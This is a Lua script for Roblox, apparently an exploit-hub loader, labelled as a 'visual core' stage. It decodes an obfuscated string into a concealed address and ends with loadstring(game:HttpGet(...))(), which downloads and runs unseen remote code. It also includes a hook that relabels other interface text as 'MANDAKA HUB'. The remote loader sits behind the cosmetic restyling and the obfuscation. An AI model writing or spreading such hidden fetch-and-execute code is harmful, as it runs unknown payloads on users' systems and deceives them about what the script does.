
--[[ STAGE 2: VISUAL CORE ]]
local Ev9HM0we5iq17U="\207\218\225\236\244\068\054\061\015\005\030\032\022\036\048\054\125\063\074\079\152\108\096\117\180\193\206\158\162\224\163\123\145"local ryPT4j_CPA0J=197 local JCDb98T1_C3RH=13 local sieqlqlSxGnvPxpCYkz=0 local WXxmtbBwL4_yA=7 local g_3QGAM_H89ealJvSTeg=14 local ioUyQwZZ9XBxj5Anmdr=false local jKfSPGTfx7vi=bit32 and bit32.bxor if not jKfSPGTfx7vi then jKfSPGTfx7vi=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local gwWzggpHB9jEFNVvBg3qj={}for NbjiVZX_qYAH=1,#Ev9HM0we5iq17U do local arw9afCk0uPXiF_iq=string.byte(Ev9HM0we5iq17U,NbjiVZX_qYAH)local ugHwabbWYqeKmAek=(JCDb98T1_C3RH+(NbjiVZX_qYAH*WXxmtbBwL4_yA)+g_3QGAM_H89ealJvSTeg)%256 if sieqlqlSxGnvPxpCYkz==0 then arw9afCk0uPXiF_iq=(arw9afCk0uPXiF_iq-ugHwabbWYqeKmAek)%256 gwWzggpHB9jEFNVvBg3qj[NbjiVZX_qYAH]=string.char(jKfSPGTfx7vi(arw9afCk0uPXiF_iq,ryPT4j_CPA0J))else arw9afCk0uPXiF_iq=jKfSPGTfx7vi(arw9afCk0uPXiF_iq,ryPT4j_CPA0J)gwWzggpHB9jEFNVvBg3qj[NbjiVZX_qYAH]=string.char((arw9afCk0uPXiF_iq-ugHwabbWYqeKmAek)%256)end end local lNrcb0AuN7vKx=table.concat(gwWzggpHB9jEFNVvBg3qj)if ioUyQwZZ9XBxj5Anmdr then lNrcb0AuN7vKx=string.reverse(lNrcb0AuN7vKx)end local ASV4W5EuyfJm6=lNrcb0AuN7vKx
local HubName = "MANDAKA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ASV4W5EuyfJm6))()
